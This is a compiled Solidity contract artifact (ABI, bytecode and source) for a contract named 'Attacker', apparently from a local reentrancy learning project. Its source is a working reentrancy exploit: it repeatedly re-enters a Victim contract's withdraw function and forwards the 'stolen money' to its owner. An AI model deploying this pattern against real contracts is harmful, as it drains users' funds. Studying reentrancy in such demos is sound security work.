{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "poorvictim",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "victim",
      "outputs": [
        {
          "internalType": "contract Victim",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "withdrawstolenmoney",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60803461007a57601f61035138819003918201601f19168301916001600160401b0383118484101761007f5780849260209460405283398101031261007a57516001600160a01b0381169081900361007a5760018060a01b03193381600154161760015560005416176000556040516102bb90816100968239f35b600080fd5b634e487b7160e01b600052604160045260246000fdfe6080604081815260049182361015610084575b50361561001e57600080fd5b60009160018060a01b0383541690670de0b6b3a76400008231101561003f57005b8184923b15610080578291845180968193633ccfd60b60e01b83525af191821561007657505061006b57005b6100749061025b565b005b51903d90823e3d90fd5b8280fd5b600090813560e01c908163930c20031461023757508063979fd9f2146101b957639e5faafc036100125782816003193601126101b557670de0b6b3a7640000928334106101765782546001600160a01b03908116803b1561017257849084845180988193630d0e30db60e41b83525af1801561016857610154575b83809550541691823b1561014f578151633ccfd60b60e01b81529284918491829084905af190811561014657506101335750f35b61013c9061025b565b6101435780f35b80fd5b513d84823e3d90fd5b505050fd5b9290936101609061025b565b9183906100ff565b82513d86823e3d90fd5b8480fd5b906020606492519162461bcd60e51b8352820152601960248201527814d95b99081b59481cdbdb5948115512081d1bc81cdd185c9d603a1b6044820152fd5b5080fd5b5091346100805782600319360112610080576001546001600160a01b031690338290036102035750828080809347908282156101fa575bf115610076575080f35b506108fc6101f0565b606490602084519162461bcd60e51b8352820152600e60248201526d4e6f7420796f7572206d6f6e657960901b6044820152fd5b9050346101b557816003193601126101b55790546001600160a01b03168152602090f35b67ffffffffffffffff811161026f57604052565b634e487b7160e01b600052604160045260246000fdfea2646970667358221220bd6ec59a98f1da9e867146f5e33038f2df245dfd50c1370a5a7a0f1aa257e63064736f6c63430008130033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.19;\nimport \"./Victim.sol\";\ncontract Attacker {\n\n    Victim public victim;\n    address private owner;\n\n    constructor(address poorvictim){\n        owner = msg.sender;\n        victim = Victim(poorvictim);\n    }\n\n    function attack() public payable {\n        require(msg.value>=1 ether,\"Send me some ETH to start\");\n        victim.deposit{value: 1 ether}();\n\n        victim.withdraw();\n\n    }\n\n    receive() external payable{\n        if(address(victim).balance>=1 ether){\n            victim.withdraw();\n        }\n    }\n\n    function withdrawstolenmoney() public {\n        require(msg.sender == owner ,\"Not your money\");\n        payable(owner).transfer(address(this).balance);\n    }\n}",
  "sourcePath": "/home/aca/smartcontracts/reentrancy/contracts/Attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.19+commit.7dd6d404.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-04-21T17:54:05.759Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}